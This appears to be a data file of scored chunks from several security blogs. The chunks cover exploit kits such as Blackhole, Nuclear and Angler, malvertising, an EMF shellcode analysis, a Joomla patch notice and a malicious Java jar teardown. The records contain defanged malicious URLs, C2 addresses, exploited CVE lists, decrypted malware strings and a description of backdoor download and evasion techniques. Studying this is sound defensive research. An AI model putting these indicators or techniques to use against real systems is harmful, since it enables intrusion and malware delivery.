I’ve slowly tracked URLs accompanying this toolkit and watched it dish out some very widely undetected malware, such as:
Information Stealing/Banking Trojans:
SpyEye
Zeus
Carberp
Mebroot Rootkit
Another more popular rootkit we’re seeing very widely on the Webroot realtime watch is: vSirefef.B/Zero-Access.
BlackHole toolkit preys on only two items in a user’s machine:
1) Unpatched operating system exploits
2) Internet browsers, add-in and plugin exploits such as Adobe and Java Software
Here are some of the known exploits the kit can execute on a victim’s machines.
Windows Operating Systems:
CVE-2010-1885 HCP (Microsoft Windows Help and Support Center in Windows XP and Windows Server 2003)
http://technet.microsoft.com/en-us/security/bulletin/MS10-042
CVE-2006-0003 IE MDAC
http://technet.microsoft.com/en-us/security/bulletin/ms06-014
Adobe Software:
CVE-2008-2992 Adobe Reader util.printf
CVE-2009-0927 Adobe Reader Collab GetIcon
CVE-2007-5659 Adobe Reader CollectEmailInfo
Java Software:
CVE-2009-1671 Java buffer overflows in the Deployment Toolkit ActiveX control in deploytk.dll
CVE-2010-0840 Java trusted Methods Chaining Remote Code Execution Vulnerability
CVE-2010-0842 Java JRE MixerSequencer Invalid Array Index Remote Code Execution Vulnerability
CVE-2010-0886 Java Unspecified vulnerability in the Java Deployment Toolkit component in Oracle Java SE
CVE-2010-1423 Java argument injection vulnerability in the URI handler in Java NPAPI plugin
The basic view the bot controller has is of the statistics page, which should indicate why I listed some of the expoits this toolkit is using. Not surprisingly, for as young as the kit is, you can see that both the Java and Adobe softwares are exploited far more than any others.
I’m sure some think they are safe using a browser other than Internet Explorer but it appears from this image there isn’t alot of difference in how this toolkit has  behaved between the three browsers it’s touched.",0.011128973708373957
"As the authors have made this toolkit easy to use, they have also made it easy to maintain a low detection rate on the binaries by using an antivirus scanning service which does not share any binaries collected with the AV industry.
The easy-to-read statistics page make it simple for the controller to view and monitor how well or poor the current bot is doing — how many operating systems it’s infected, what type of operating systems were infected, and in which countries they’re located.",0.011751972018233747
Image 2 is the preference page where the user of the control panel can make quick changes to the toolkit’s delivery methods or the binary state via virus scan.,0.011635389481533198
"The below images show how easy it is to see that the authors had some form of longevity in mind by giving the controller to ability to set any type of rule to avoid quick detections on the  delivery points, along with quick means to replace any file at any given time.",0.010006897122398883
"Blackhole uses custom file encryptions to assist in avoiding detections but oddly enough, they have chose to use some static file naming for the actual files, as they would exist on a victims machine.
So far Ive only encountered four static names:
contact.exe
readme.exe
info.exe
about.exe
calc.exe
This glance at the Blackhole Toolkit confirms the dependence on outdated operating systems and outdated software in general, in order for it to exist efficiently.
",0.009502126851383852
"Nuclear EK leverages recently patched Flash vulnerability
Back in October 2014, we wrote an article about a particular malware campaign we nicknamed ‘EITest’.
The actors behind it were using hacked sites and bogus .us.to subdomains to redirect their victims to the Angler Exploit Kit which finished the job and infected vulnerable machines.
Fast forward a few months and we are back to the same modus operandi, except this time the Nuclear Exploit Kit is the weapon of choice.
What is noteworthy is the crooks are using a recently patched Flash Player vulnerability (a variant of CVE-2015-0336) that affects version 16.0.0.305 and older, released on February 5.",0.011103487988882166
"Malwarebytes Anti-Exploit users are already protected against this threat.
The Flash exploit was packed with secureSWF (a legitimate program from Kindi software) to protect it from decompilers and make security researchers’ jobs more interesting. The bad guys simply used the “demo version”, good enough and anonymous.",0.011340443163707081
"We immediately reached out to Adobe and they quickly responded:
Adobe has confirmed that a variant of CVE-2015-0336 is being exploited ITW. CVE-2015-0336 was resolved in Flash Player 17.0.0.134 (see APSB15-05​).
We updated our Exploit Kit graph to account for CVE-2015-0336 in Nuclear EK:",0.013902864302721252
Network traffic (Nuclear EK),0.015647861733747215
"Payload
The malware (821c8b01abbb1da4d790aa1bca98c4e4) gets dropped as a .tmp file and performs some anti virtualization detections according to malwr.com",0.012233352385597418
"Malwarebytes Anti-Malware detects this threat as Trojan.GenPe3.ED.
This latest adoption of a recently fixed vulnerability is a reminder that patching software should be done on a regular basis.
We know that in some cases consumers but most likely businesses cannot always apply patches right away. Many times they need to do some internal testing to make sure the patch does not break some of their processes.
Such systems should ideally be sandboxed from the rest of the network or be running anti-exploit software designed to block known and unknown exploits.
",0.009665825830516561
"Over the past week, cybercriminals have resumed spamvertising fake “ADP Immediate Notifications” in an attempt to trick users into clicking on the malicious links found in the emails. The links point to the latest version of the Black Hole Exploit Kit, and consequently, exploit CVE-2013-0422, affecting the latest version of Java.
With no fix for this vulnerability currently available, users are advised  to disable Java immediately.
More details:",0.012940731227094271
Sample screenshot of the spamvertised email:,0.010990132234593664
"Sample compromised URLs participating in the campaign:
hxxp://tasteofindiabombaylounge.com/wp-content/plugins/znditibioux/chkpayroladp.html
hxxp://switchedonspeech.com/wp-content/plugins/zalyhvjiose/chkpayroladp.html
hxxp://accoformation.com/wp-content/plugins/zkgqchwvioo/chkpayroladp.html
hxxp://chevinaudio.com/wp-content/plugins/zeueeewovgu/chkpayroladp.html
hxxp://vilmatangalin.com/wp-content/plugins/zoaiecbxuce/chkpayroladp.html
hxxp://jscotti.com/wp-content/plugins/zekuopocogo/chkpayroladp.html
hxxp://chevinaudio.com/wp-content/plugins/zeueeewovgu/chkpayroladp.html
hxxp://trotzlabsusf.com/wp-content/plugins/ztyuugjoiie/chkpayroladp.html
hxxp://lose-weight-recipes.com/wp-content/plugins/zeffieyoyre/chkpayroladp.html
hxxp://chevinaudio.com/wp-content/plugins/zeueeewovgu/chkpayroladp.html
hxxp://peckerala.com/wp-content/plugins/zmjnaoomuwu/chkpayroladp.html
hxxp://ibrillantes.com/wp-content/plugins/zeejqmriief/chkpayroladp.html
hxxp://pailletdebesombes-architectes.com/wp-content/plugins/zhrxidlloea/payrolstatchk.html
hxxp://floridafirstinsurancefl.com/wp-content/plugins/zibeolboqnb/payrolstatchk.html
hxxp://40fingersband.com/wp-content/plugins/zqkeeonkjha/payrolstatchk.html
hxxp://centerlinkmedia.com/wp-content/plugins/zontouobbml/payrolstatchk.html
hxxp://lucilukis.com/wp-content/plugins/zqeibeatobd/payrolstatchk.html
hxxp://pailletdebesombes-architectes.com/wp-content/plugins/zhrxidlloea/payrolstatchk.html
hxxp://jiancerenzheng.com/wp-content/plugins/zoaisnusyoh/payrolstatchk.html
hxxp://usa-corporations.com/wp-content/plugins/zhoodeeoeqe/payrolstatchk.html
hxxp://fklawchambers.com/wp-content/plugins/zaoqxuuwrlb/payrolstatchk.html
Sample client-side exploits serving URL:
hxxp://tetraboro.net/detects/coming_lost-source.php
Sample malicious payload dropping URl:
hxxp://tetraboro.net/detects/coming_lost-source.php?huyq=1m:2v:1g:1o:1k&tfize=32&wodyva=33:1k:1o:1n:1f:1i:1m:1i:32:2w&jqrub=1n:1d:1g:1d:1h:1d:1f
Malicious domain name reconnaissance:
tetraboro.net – 222.238.109.66 – Email: bannerpick45@yahoo.com
Name Server: NS1.HOSTCLAM.NET – 50.115.163.10
Name Server: NS2.HOSTCLAM.NET – 90.167.194.23
Responding to 222.238.109.66 are also the following malicious campaigns part of the campaign:
royalwinnipegballet.net
advertizing9.com
eartworld.net
hotelrosaire.net
Upon successful client-side exploitation, the campaign drops MD5: 5a859e1eff1ee1576b61da658542380d – detected by 12 out of 46 antivirus scanners as Worm:Win32/Cridex.E.
The sample drops the following MD5 on the affected hosts:
MD5: 472d6e748b9f5b02700c55cfa3f7be1f – detected by 8 out of 46 antivirus scanners as PWS:Win32/Fareit
Once executed, it also phones back to the following command and control servers:
173.201.177.77
132.248.49.112
95.142.167.193
81.93.250.157
Webroot SecureAnywhere users are proactively protected from these threats.
You can find more about Dancho Danchev at his LinkedIn Profile. You can also follow him on  Twitter.
",0.017226365880420702
"New wave of malvertising leverages latest Flash exploit
A well known malvertising gang famous for its use of the fingerprinting technique and other evasion tricks to bypass security checks has been ramping up its activity against many different ad platforms to push malware via top websites.
The setup for these malvertising attacks relies on a combination of techniques that start with the fraudulent advertiser choosing a victim, typically a legitimate website in the retail, or legal business. The goal is to use someone else’s identity to appear legitimate when approaching ad networks.
The ad banners are designed professionally by the miscreants and then hosted along with the ad code on shadowed domains. The owners of said domains are completely unaware that a subdomain has been created on their hosting platform, let alone that it is serving malicious ads.
Here is the interesting part though. The ads are typically clean of any malware for anyone trying to manually verify them. The JavaScript code looks benign no matter how many times you refresh the page or rotate IP address. This is because the rogue version of the JavaScript is served conditionally, with the proper referer, user-agent, sometimes even your screen resolution, and several other parameters.
Once a genuine user is identified (a victim that happened to browse a particular publisher serving that ad), another series of checks – which we call fingerprinting – is performed to ensure that only those that are likely to get infected are indeed redirected to the Angler exploit kit.
Recently, researchers at Proofpoint identified a small but noteworthy change in the redirection mechanism to Angler. Rather than using the Google DoubleClick HTTPS open redirector, threat actors switched to programmatic marketing platform Rocket Fuel’s (rfihub.com). Perhaps this was decided as a result of increased scrutiny on the DoubleClick redirector, but regardless, it serves their goal of launching the exploit kit URL in an encrypted manner, making it more difficult for security companies to identify attacks.
Below are some popular websites that we identified in our telemetry, inadvertently serving the malicious ad banners via one of several ad platforms (Rocket Fuel, PLYmedia, Zedo, AppNexus, ShareThrough, Rubicon, DoubleClick) eventually leading to the Angler exploit kit.",0.015837377214561466
"dailymotion.com
kijiji.ca
vodlocker.com
answers.com
cda.pl
cbssports.com
m.mlb.com
legacy.com
thechive.com
cbs.com",0.015257805099020305
"* Ranked by monthly traffic according to SimilarWeb.com. Note that each site served a varying number of impressions of those malicious ad banners.
Angler EK converts visitors exposed to the malicious ads into ransomware victims via its own CryptXXX product. An aggravating factor in this case is the fact Angler is using a very recently patched Flash Player exploit (CVE-2016-4117). This entire sequence does not require any user interaction at all. As soon as soon as the advert gets displayed, the exploit redirection and infection automatically take place.",0.012286367820425692
"Figure 1: the ‘dirty’ version of an ad banner showing its real intent
Rogue ad servers (shadowed domains):",0.011549412042594964
"pix.canadianhedgewatch.com
front.business-mastery.ca
net.glawgp.com
pixels.respondez.co.uk
ads.sicurauto.com
probe.registermyserviceanimal.com
dy.wwcpga.com",0.013935433491018556
Malwarebytes Anti-Exploit detects the malicious banners and also blocks the latest Flash exploit (CVE-2016-4117):,0.009883919565686572
"We are pleased to say that we received quick acknowledgements from almost all the ad networks involved and that they have already taken measures to ban the fraudulent advertisers and their purveyors.
",0.016089271589202148
Up2Date 7.302 Released,0.007936526087480966
Up2Date 7.302 is now available for download and installation. This Up2Date introduces a new Web Content Filter engine for faster and more accurate classifications.,0.009874636066757536
"Written by
Angelo Comazzetto",0.008855311348334505
"September 18, 2008",0.008960254950000524
Network up2date,0.007611986957109407
Up2Date 7.302 is now available for download and installation. This Up2Date introduces a new Web Content Filter engine for faster and more accurate classifications.,0.009874636066757536
"The new system offers 97 categories that have been fully integrated into WebAdmin and the previous categories have been imported. To take full advantage of the new abilities of this Up2Date, administrators should review their Web Security categories after installation is complete.
Remarks: Web Security Categories will be updated System will be restarted
News: – HTTP Content filter subcategories will be extended, please check your configuration – Improved URL Filter for HTTP Proxy – Increased Web Security Classification Categories to 97 (Up from 60) – Improved device agent for ACC 1.9 – Added option to flush authentication cache – Fixed clamav vulnerabilities CVE-2008-3912, CVE-2008-3913, CVE-2008-3914
Bug Fixes:
Fix: 9017  Quarantine Report not sent as specified
Fix: 7717  Problem with colon in local user password
Fix: 8975  Special characters in emails are not processed correctly
Fix: 8930  User data can not be changed Fix: 8910  Outgoing emails might get signed although signing is off
Fix: 9028  Releasing of quarantined mails may not work
All Up2Dates are GNUPG-signed! In regards to the new features and benefits of AxG 7.3, please read the V7.3 Release Notes PDF. The Astaro Up2Date technology makes it easy to upgrade your installed Astaro Security Gateway to the latest version. There are two ways to apply an Up2Date package to the system:
1) Log on to WebAdmin, navigate to Management >> Up2Date >> Overview and use Update to latest version now to install the Firmware Up2Date. Click on then Watch Up2Date Progress in new window and an extra browser window will show the progress of the Up2Date installation and the System administrator will receive a notification email once the Up2Date process has finished successfully.
2) Download the Up2Date package from our HTTP or FTP Server and install it under Management >> Up2Date >> Advanced: (MD5sum: b3ce692ea24f216e6bffd4251062d404 Size  : 112460063 bytes)",0.010253222746922197
"HTTP: Astaro US – Astaro US2 – Astaro Germany – Astaro Germany2 –  Japanese Mirror
FTP: Astaro US – Astaro US2 – Astaro Germany – Astaro Germany2 – Japanese Mirror",0.016244297904651206
"Feedback If you want to provide feedback or want to discuss any of the AxG V7 features you should post it on our User Bulletin Board. Please take care to add always(!) the version you refer to (e.g. ""[7.302] Quarantine Report ""). If you have feedback to our documentation (Online Help) please send it to docu@astaro.com. There is also a demo server: http://demo.astaro.com All Up2Dates are GNUPG-signed! Your Astaro R&D team",0.013244443299961772
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
"Share on LinkedIn
",0.009855679767380665
"Metafile art class
2008-06-01",0.00898370354945588
"Dennis Elser
Secure Computing Corporation
,
Germany
Editor:
Helen",0.008841379945415007
"Martin
Abstract
Like its predecessor the Windows Metafile Format, the Enhanced Metafile Format has proven to be susceptible to misappropriation. Dennis Elser provides an in-depth description of a recent remotely exploitable file format vulnerability within the Windows graphics device interface (GDI).
Copyright © 2008 Virus Bulletin",0.009166629621223388
"Just like its predecessor the Windows Metafile Format (WMF), the Enhanced Metafile Format (EMF) consists of descriptive commands for drawing an image rather than bitplanes of the rendered image itself. And just like malformed WMF files [1], Enhanced Metafiles have also proved to be susceptible to misappropriation.
This article provides a technical analysis of a recent remotely exploitable file format vulnerability within Windows’ graphics device interface (GDI) [2].",0.011877544993947331
"Paint by numbers
The idea behind WMF and EMF files is application and device independence, respectively: metafiles contain a sequence of records that guide a drawing device in how to render an image.
There is no serious difference in functionality between the two file formats other than EMF being truly device independent by maintaining its dimensions, shape and proportions [3].
All EMF records begin with a 32-bit field which is used to identify the record type and another 32-bit field for the size of the record; both fields are in Little-Endian byte order. Next, there is record-specific data of variable length. An EMF image always starts with a header record (type = 0x1), followed by a sequence of EMF data records and an end-of-file record (type = 0xE).
A record’s ‘Size’ field, as shown in Figure 1, is used by the parser as an offset to find the beginning of the next record (current record’s file offset + ‘Size’). However, there have also been EMF records with ‘overlapping’ data, as was the case with the first EMF exploit (MD5: 7DB16FD50CF76CEF3d29DE47239C1F9A), which was found in the wild only two days after Microsoft published security bulletin MS08-021. Overlapping data wasn’t relevant for the exploit’s success, but was probably carelessness on the part of the exploit’s author and a sign of intentionally corrupted data – easy to spot.
Figure 1. General structure of EMF records and the EMR_COLORMATCHTOTARGETW record.",0.01435315783926483
"Image interpretation
We can see three records in the exploit’s hex-dump shown in Figure 2 below. Its green markers show the record’s type; blue ones show the record’s length. The exploit’s first record type is EMR_HEADER (0x1), one of approximately 122 different record types. Its second is EMR_COLORMATCHTOTARGETW (0x79).
Figure 2. Hex-dump of an EMF exploit.
The exploit’s third record (0xF1CF7512) is invalid, since the highest record-type number defined on current NT-based machines is 0x7A (wingdi.h). As we will see later, the reason for this is the second record’s data exceeding its stated ‘Size’.
By interpreting the structure of record type EMR_COLORMATCHTOTARGETW, which begins at file offset 0x9C in the exploit’s hex-dump above, we can find out what causes the overflow. Each of the structure’s fields has a size of 32 bits, with the ‘Data’ field being the only exception: it is an array of bytes that holds a Unicode name of a colour profile with additional raw colour profile data appended. A colour profile is a file that contains information about the conversion of colours in the context of a specific device [3].
In Microsoft’s specification, the size of a ‘Data’ field in bytes is appointed by the sum of the ‘cbName’ (0x0) and ‘cbData’ (0x38) fields, which in the exploit’s case results in 0x38. So apparently, the exploit’s ‘Data’ array at file offset 0xB4 is reserved; 0 bytes for a colour profile name but 0x38 bytes for raw colour profile data. However, internal handling of this array of bytes looks a little different, as we will see below.
As soon as the Windows GDI parses an EMF file, its size fields are sanity checked (the sum of ‘cbName’ and ‘cbData’ must not int-overflow). Depending on the result of these checks, the particular record is flagged as either good or bad internally and only good ones are allowed further processing.
Once an EMR_COLORMATCHTOTARGETW record has passed this test, its ‘Data’ buffer is processed by ‘BuildIcmProfilePath()’, which is the function responsible for building a temporary colour profile’s path on stack. However, the whole ‘Data’ buffer is interpreted as a Unicode string by the function without considering the size limitations provided by the ‘Size’ and ‘cbName’ fields. So even given a record length of 0x50, the GDI’s EMF parser keeps reading beyond the EMR_COLORMATCHTOTARGETW record’s limits until a null-termination character is found within the ‘Data’ Unicode string.",0.01658940864185987
"Art forgery detection
As both its partial disassembly (Figure 3) and stackframe (Figure 4) show, the maximum length of a path constructed by ‘BuildIcmProfilePath()’ was supposed to be restricted to 0x104 wide characters (520 bytes). However, due to inappropriate use of wcsncat(), the actual maximum restriction is 3 * 0x104 wide characters in theory (1560 bytes), which is far more than can be stuffed into ‘tempbuf’. ‘tempbuf’ can hold a maximum of 262 wide characters including the null-terminating character.
Figure 3. Broken implementation of ‘BuildIcmProfilePath’.
Figure 4. Stackframe of ‘BuildIcmProfilePath’.
This particular bug is found in early versions of gdi32.dll (i.e. XP SP0). Later versions of gdi32.dll (pre-MS08-021) succeed in calculating the remaining space of ‘tempbuf’ using wcslen(), but still fail to prevent the stack from being overwritten with ‘Data’ in a subsequent lstrcpyW() call found in ‘IcmCreateColorSpaceByName()’ – which reflects the vulnerability that has been fixed with MS08-021. Starting with that latest patch, the maximum number of wide characters copied to the stack is limited to 0x104.
In the end, with this limitation in effect, Microsoft deprecated its own EMF specification, since ‘cbName’ and ‘cbData’ are both 32-bit integers that allow far more bytes to be reserved for a colour profile.
It’s not clear why a stack buffer of fixed size has been used instead of a heap buffer allowing for dynamic size, but the insights gained from the process of parsing the EMF structure can now be used for defensive purposes. They allow us to build a generic detection mechanism for MS08-021-specific exploits by checking for EMR_COLORMATCHTOTARGETW records (and probably related ones) having a ‘Data’ field in relation to a filename with more than 0x104 wide characters.
Figure 5. Unpatched EMF vulnerability.",0.012972123347560371
"Soft-focus effect
With the record’s structure in mind and looking at the exploit’s hex-dump again (Figure 2), it is evident that ‘Data’ doesn’t contain a valid colour profile name and the number of wide characters in total exceeds 0x104 (the latter not being visible in the screenshot). Instead, the question of where exactly the exploit’s shellcode has been placed is answered by disassembling the record’s suspicious-looking ‘Data’ field at file offset 0xB4.
The shellcode (Figure 6) is XOR-encoded by an eight-bit key in order to avoid null-words, which could render the exploit ineffective when interpreted as zero-termination of Unicode strings. Once the shellcode has decoded itself on the stack, it uses the Process Environment Block (PEB) to find the base address of kernel32.dll in order to import several API functions by conducting a hashed string comparison of the APIs. These are used to download and install a backdoor, with a file name as ‘unambiguous’ as it can get – ‘word.gif’, from igloofamily.com (a domain hosted in Korea).
Figure 6. Shellcode found within an exploit’s EMR_COLORMATCHTOTARGETW record.
The shellcode possesses the ability to bypass modern behaviour blockers that detect API functions being called from unusual places like the stack. This circumvention works by inserting a faked return address into the stack before calling an API function. The detoured return address points into a ‘ret’ assembler instruction within kernel32.dll, which in turn pops the real return address off the stack to be able to return control to the real caller. By doing so, a behaviour blocker is tricked into believing the actual caller is within the Windows kernel32 library area instead of shellcode on stack, thus being legitimate (Figure 7). The ‘ret’ instruction that is used as a detour is searched for manually within the kernel32.dll module near the address of WinExec().
Figure 7. Behaviour blocker evasion mechanism.
In large part, this downloaded variant of the ‘Poisonivy’ backdoor consists of multi-layered, encrypted and position-independent code. Position-independent code not only makes it harder to read the disassembly, in this context it is necessary since the code is injected into the memory space of running processes such as ‘explorer.exe’ or ‘msnmsgr.exe’ (via WriteProcessMemory and CreateRemoteThread APIs).
As soon as the injected thread is executed, it creates a ‘hidden’ copy of the trojan as an NTFS alternate data stream (ADS) named ‘win_socks.exe’, attached to the ‘system32’ folder in the Windows directory. Its launch upon system reboot is ensured by the creation of an ‘Active Setup’ registry key in ‘HKCU\Software\Microsoft\Active Setup\Installed Components\{E5C1F9EA-A8FE-FCBC-9F3D-C2791859730F}’, named ‘StubPath’.
Afterwards the code stays in a loop waiting for MSN Messenger (msnmsgr.exe) to be run in order to inject another piece of self-decrypting code into it. This remote thread will initiate a connection with ‘word.4pu.com’, ‘word1.4pu.com’ and ‘word2.4pu.com’, giving the attacker total control over the compromised system. Since it is a program that is usually allowed to pass the firewall on most systems, MSN Messenger makes an ideal target for a backdoor like this variant of ‘Poisonivy’.",0.017558793774988923
"Conclusion
Looking back at its history, the GDI has been a popular target among attackers. Besides the relatively recent EMF holes, GDI has also been vulnerable to remote attacks in the past, like the two ANImated cursor vulnerabilities (MS05-002 and MS07-017), a JPEG vulnerability in GDI+ (MS04-028) and WMF vulnerabilities (MS06-001). But thankfully there has been evolution: it’s good to see the quality of the code going through different security stages, from using unsafe functions to using safer functions up to using proprietary safe functions in combination with the /GS compiler option.
As demonstrated by this article, it’s not just lucrative business for the bad guys to perform binary code auditing and have a thorough look at the facts, but also for the good guys who need to defend these attacks. Vulnerabilities, like February’s Adobe Reader vulnerability (CVE-2008-0655) and April’s MS08-021 GDI vulnerability, begin to be exploited just a few days after the vendor’s patch release – much faster than corporations may need to verify and deploy the patches. If we know the exact causes of vulnerabilities, we do not need to wait for the first exploits to fall into our hands in order to protect and defend ourselves effectively. Instead, we are able to tell apart benign structures from abnormal ones and thus can defend proactively against upcoming attacks.",0.013171596632770677
"Bibliography
[1] Ferrie, P. Inside the Windows Meta File format. Virus Bulletin, February 2006, pp.5-8. http://www.virusbtn.com/vba/2006/02/vb200602-wmf.
[2] Microsoft Security Bulletin MS08-021. http://www.microsoft.com/technet/security/bulletin/ms08-021.mspx.
[3] Enhanced Metafile Format Specification Revision 2.0. http://msdn2.microsoft.com/en-us/library/cc204166.aspx.
",0.016352966606291597
Joomla! 3.3.5 Released – Fixing High Priority Security Issues,0.008238587536456676
Update: It seems like there is a glitch in the new version and the Joomla team is urging its users not to upgrade yet. From their Twitter:,0.014906413549656272
"Original post:
The Joomla team just released versions 3.3.5, 3.2.6 and 2.5.26, patching high priority security issues. The first one is an Remote File Include (RFI) vulnerability and the second one is a Denial of Service (DoS) vulnerability that affect all previous versions. If you are using Joomla, stop what you are doing and update it now!
The good news for our clients and what’s very exciting for us, me especially, is to see how the virtual hardening on our CloudProxy Website firewall protected our clients automatically against this vulnerability. As our researchers started to analyze the disclosure, we quickly noticed that it was already covered and the URL used to trigger this bug was already blocked by default. It means that our clients got zero-day protection without anyone even knowing about this issue.
For more information on these vulnerabilities, you can get straight from the Joomla! release notes:
High Priority – Core – Remote File Inclusion:
Project: Joomla!
SubProject: CMS
Severity: Moderate
Versions: 2.5.4 through 2.5.25, 3.2.5 and earlier 3.x versions, 3.3.0 through 3.3.4
Exploit type: Remote File Inclusion
Reported Date: 2014-September-24
Fixed Date: 2014-September-30
CVE Number: CVE-2014-7228
Inadequate checking allowed the potential for remote files to be executed.
This issue was discovered by Johannes Dahse and disclosed to Akeeba (and Joomla). The Akeeba team released a good post explaining the issue. We recommend reading if you are interested in the technical details.
Medium Priority – Core – Denial of Service:
Project: Joomla!
SubProject: CMS
Severity: Low
Versions: 2.5.4 through 2.5.25, 3.2.5 and earlier 3.x versions, 3.3.0 through 3.3.4
Exploit type: Denial of Service
Reported Date: 2014-September-24
Fixed Date: 2014-September-30
CVE Number: CVE-2014-7229
Inadequate checking allowed the potential for a denial of service attack.
Again, if you are using the Joomla! we highly recommend updating immediately.
",0.012730180212348174
Malware in a Jar,0.006491560165373
"As researchers find more security flaws in Oracle Java, the software continues to be used for exploitation and malware delivery.  This year has been a shaky start for the cross-platform web technology, where it seems the number of documented vulnerabilities is hard to number.",0.010960581316934115
"If you recall in January, we saw a zero-day later found to be responsible for intrusions into companies like Microsoft, Apple, Facebook, and Twitter.  Then in February, after seeing a Java patch with over 50 security fixes, reports surfaced thereafter that Bit9 was hacked using a separate java zero-day.  Even still in March, an emergency patch was issued to address even more vulnerabilities.
Because we’re seeing java used more in malware, it’s important for researchers to know how to analyze and understand java code.Let’s take a look at one java archive (“jar”) we’ve seen in the wild that not only contains multiple exploits but also has an encrypted malware payload.  This sample was provided by Malwarebytes researcher Jerome Segura and is called “sexy.jar”.  The landing page, “sexy.html”, loads the jar as an applet and points to Q.class, a Java class file within the jar.  To get more details on this, check out Segura’s blog entry on this here.",0.00963238068629435
"It’s important to understand that a jar is essentially just a zip archive, a file-format you’ve probably seen since you started using computers.  Inside the archive are various things, most important of which are class files, or compiled java bytecode.  This bytecode is executed within a Java Virtual Machine (JVM), part of the Java Runtime Environment (JRE), a term dubbed by Oracle describing Java’s execution environment.  Many of you with Java installed on your computer use the JRE every day when you visit your favorite websites.",0.01395182514777693
"In order to streamline analysis of java class files, we can use a popular tool known as a Decompiler, which attempts to decompile programs into their original source code.  The Java Decompiler project offers a graphical utility called “JD-GUI” for displaying Java sources, and is my personal favorite and one of the best in the field.  Another great tool for those who prefer the command-line is JAD, which essentially does the same thing and can be found here.  Both of these tools are available on Windows, Mac, and UNIX-based systems.
Analysis
Let’s go ahead and take our jar and decompile it using JD-GUI.  After that, we can view the code statically and attempt to understand what’s going on.",0.013849246084881583
"When we load sexy.jar into JD-GUI, we see a package called “game” and six class files, along with another file titled “sexy”.  As I mentioned before, the “Q” class in the jar is loaded as an applet, which will reference other packaged class files throughout execution.  The file labeled “sexy” contains an encrypted malware payload that will be dropped to the disk and executed.  This is not a traditional approach as a jar usually doesn’t contain the malware itself.
You’ll instantly notice that all the strings are part of the “O” class.  These are all encrypted using rot13, a simple substitution cipher that I talked about here.  You’ll notice that every string declared in this class is first passed through the rot13 function at the bottom of the code.",0.014640147524867753
"Here are the decrypted strings used in this jar:
J
1.7
java.security.AllPermission
com.sun.jmx.mbeanserver.JmxMBeanServer
javax.management.MBeanServerDelegate
declaredMethods
game.N
oZroFxLCOA4Vi6ck_oH
getMBeanInstantiator
add
java.security.CodeSource
java.security.ProtectionDomain
set
java.io.tmpdir
oZroFxLCOA4Vi6ck_oH
sun.org.mozilla.javascript.internal.GeneratedClassLoader
file:
javax.management.MBeanServer
oZroFxLCOA4Vi6ck_oH
com.sun.jmx.mbeanserver.MBeanInstantiator
sun.org.mozilla.javascript.internal.Context
XrwfQ_w.exe
G
java.version
aced0005757200135b4c6a6176612e6c616e672e4f626a6563743b...
java.security.cert.Certificate
java.io.tmpdir
com.sun.jmx.mbeanserver.Introspector
java.security.Permission
findClass
os.name
Windows
P
java.security.PermissionCollection
GWiL2S.exe
java.security.Permissions
elementFromComplex
newMBeanServer
oZroFxLCOA4Vi6ck_oH
The jar uses two exploits against the JVM to run the decrypted payload: CVE-2012-0507 and CVE-2013-0422.
CVE-2012-0507
The CVE-2012-0507 exploit is attempted first, implemented in the C and Z classes.  CVE-2012-0507 is a vulnerability in the JRE that occurs because the AtomicReferenceArray class does not check if an array is of an expected Object[] type (you can read more about this here).
The C class contains a long hex string (as seen above) that decodes to methods used for the exploit.",0.01028141096437285
Eventually the “Z” class creates a new class during runtime (game.N) to drop the malware in %temp%\XrwfQ_w.exe,0.010257075355884493
The new class first has to be decoded in the “W” class XorDecrypt function; this takes a large encrypted bytecode array called encoded and decrypts it as the “N” class.,0.014538658666440996
"Finally we can see the file is decrypted and dropped within the “N” class, using the dropFile function.",0.013458678621606435
"CVE-2013-0422
The second exploit, CVE-2013-0422 is called if you’re running Java 7 and is implemented in the T class.  The exploit uses a private mBeanInstantiator object and the findClass method to reference arbitrary classes, which in this case is also our embedded “N” class.  If the jar takes this exploit route, the payload is dropped in in %temp%\GWiL2S.exe",0.007103548002717841
"Debugging an applet
In some situations you might want to see things dynamically as they execute instead of the plain static view.  This can be accomplished with our jar by debugging it as an applet.
Debugging a jar isn’t as straightforward as a native system binary, like an EXE.  One of the best methods I’ve found is using the Eclipse IDE for Java Developers to step through the code.  However, if you’re going to take this route, you’re going to need to do a little prep work.
First we’ll need to overwrite library files in the JRE install directory with those from the Java Development Kit (JDK), a tool used to assist Java developers.  We need to do this because the library files in the JDK are compiled with debugging information that you’ll need to step into core java classes.  Here are the steps to do this:",0.016640022618777395
"Backup the .jar files from JRE_HOME/lib
Download and install a JDK for the SAME VERSION as your JRE.
Copy the .jar files from JDK_HOME/jre/lib to JRE_HOME/lib",0.010667419217836316
"Once you’ve completed this step, you can launch Eclipse and create a new project.  You’ll want to set it up in a similar way to the jar you’re analyzing (in this case, a package called game and all the java sources inside).  Here is what mine looked like below.",0.016261564293207798
"Next you’ll need to build a Debug Configuration for the applet.  Make sure that you pay attention to any parameters the applet might need to execute properly (in the case of this jar, there are 3).",0.013271311103201011
"Now you need to set a breakpoint in your code and you can start debugging.  Also, you may need to add java source files to your project’s build path if you want to step into java system libraries and observe that code.
Notice how I’ve taken a few steps in the code and already retrieved the OS name, Java version, and some parameters.  I can continue to step through the code and terminate the applet when desired.",0.012935149344192376
"Conclusion
I hope this article gave you a better understanding of the java exploitation landscape.
Understanding how to analyze java code is necessary as the web technology from Oracle continues to be exploited; there’s no doubt we’ll continue to see jars used in malware, as well new techniques like embedded class files and encrypted malware payloads within the jar to keep researchers on their toes.
With some practice and prior programming knowledge, most java code can be understood when viewing decompiled source code.  Debugging is always an option too, but the setup time can be lengthy, so it may not be worth the effort in some cases.  If you do end up choosing this route, remember to do so in a secure, isolated environment, like a Virtual Machine, to prevent malware infections.  When you analyze and execute malware, you do so at your own risk, so take plenty of precautions.
_______________________________________________________________________________
Joshua Cannell is a Malware Intelligence Analyst at Malwarebytes where he performs research and in-depth analysis on current malware threats. He has over 5 years of experience working with US defense intelligence agencies where he analyzed malware and developed defense strategies through reverse engineering techniques.  His articles on the Unpacked blog feature the latest news in malware as well as full-length technical analysis.  Follow him on Twitter @joshcannell
",0.011427203320289459
"Following the recent events, opportunistic cybercriminals have been spamvertising tens of thousands of malicious emails in an attempt to capitalize on on the latest breaking news.
We’re currently aware of two “Boston marathon explosion” themed campaigns that took place last week, one of which is impersonating CNN, and another is using the “fertilizer plant exposion in Texas” theme, both of which redirect to either the RedKit or the market leading Black Hole Exploit Kit.
Let’s profile the campaigns that took place last week, with the idea to assist in the ongoing attack attribution process.
More details:",0.013357815237456938
Sample screenshot of the displayed video mix of videos hosted on YouTube:,0.011194455219432409
